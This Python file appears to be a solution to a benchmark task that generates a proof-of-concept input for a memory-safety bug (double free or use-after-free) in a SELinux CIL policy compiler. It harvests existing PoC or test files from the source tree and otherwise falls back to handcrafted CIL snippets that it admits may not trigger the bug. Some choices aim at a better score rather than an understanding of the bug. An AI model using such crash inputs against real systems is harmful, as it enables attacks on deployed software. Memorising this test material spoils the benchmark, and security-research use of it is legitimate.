import os
import re
import tarfile
from typing import List, Tuple, Optional


class Solution:
    def _iter_files(self, src_path: str) -> List[Tuple[str, bytes]]:
        files = []
        if os.path.isdir(src_path):
            for root, _, fnames in os.walk(src_path):
                for fn in fnames:
                    p = os.path.join(root, fn)
                    try:
                        sz = os.path.getsize(p)
                        if sz > 2 * 1024 * 1024:
                            continue
                        with open(p, 'rb') as f:
                            files.append((p, f.read()))
                    except Exception:
                        continue
        elif tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size > 2 * 1024 * 1024:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            files.append((m.name, f.read()))
                        except Exception:
                            continue
            except Exception:
                pass
        else:
            try:
                with open(src_path, 'rb') as f:
                    files.append((src_path, f.read()))
            except Exception:
                pass
        return files

    def _score_candidate(self, text: str) -> int:
        score = 0
        # Key constructs we want: macro, classpermissionset rule, call, classpermission
        if re.search(r'\(macro\b', text):
            score += 3
        if 'classpermissionset' in text:
            score += 3
        if re.search(r'\(call\b', text):
            score += 2
        if 'classpermission' in text:
            score += 2
        # Prefer files that look like PoCs
        if re.search(r'(PoC|poc|CVE|double\s*free|use\s*after\s*free)', text, re.IGNORECASE):
            score += 2
        # Penalize huge files
        if len(text) > 65536:
            score -= 2
        return score

    def _find_best_poc_from_repo(self, files: List[Tuple[str, bytes]]) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str, bytes]] = []
        for name, data in files:
            lower = name.lower()
            if not any(lower.endswith(ext) for ext in ('.cil', '.policy', '.cilp', '.cilx')):
                # Consider small text-like files that may embed CIL
                if not any(tok in lower for tok in ('/test', '/tests', 'poc', 'regress', 'repro', 'example', 'samples')):
                    continue
            try:
                text = data.decode('utf-8', errors='ignore')
            except Exception:
                continue
            # Quick heuristic: must contain 'classpermissionset' to be relevant
            if 'classpermissionset' not in text:
                continue
            score = self._score_candidate(text)
            if score <= 0:
                continue
            # Prefer shorter viable snippets
            candidates.append((score, len(text), name, data))
        if not candidates:
            return None
        # Sort by score desc, then length asc
        candidates.sort(key=lambda x: (-x[0], x[1]))
        return candidates[0][3]

    def _fallback_poc(self) -> bytes:
        # Best-effort handcrafted PoC based on typical CIL syntax.
        # It attempts to pass an anonymous classpermission to a macro that uses a classpermissionset rule.
        # This may or may not trigger depending on exact grammar; used only if repository-derived PoC is unavailable.
        poc_variants = [
            # Variant 1: macro with classpermission param used directly in classpermissionset rule
            b"""
; fallback PoC - may not be used if repo includes a proper PoC
(class file (read write))
(macro m ((cp classpermission))
    (classpermissionset myset cp)
)
(call m ((file (read))))
""",
            # Variant 2: try with block and simple call syntax
            b"""
(block b
    (class file (read write))
    (macro m ((cp classpermission))
        (classpermissionset s cp)
    )
    (call m ( (file (read)) ))
)
""",
            # Variant 3: define anonymous classpermission via inline and combine in classpermissionset
            b"""
(class file (read write getattr open))
(macro mk ((p classpermission))
    (classpermissionset Z (and p p))
)
(call mk ( (file (read)) ))
"""
        ]
        # Return the shortest variant for better score
        poc_variants.sort(key=len)
        return poc_variants[0]

    def solve(self, src_path: str) -> bytes:
        files = self._iter_files(src_path)
        poc = self._find_best_poc_from_repo(files)
        if poc:
            # Try to trim leading/trailing whitespace to reduce length a bit, keep inner content unchanged
            poc_str = poc.decode('utf-8', errors='ignore')
            poc_str = poc_str.strip()
            return poc_str.encode('utf-8', errors='ignore')
        return self._fallback_poc()
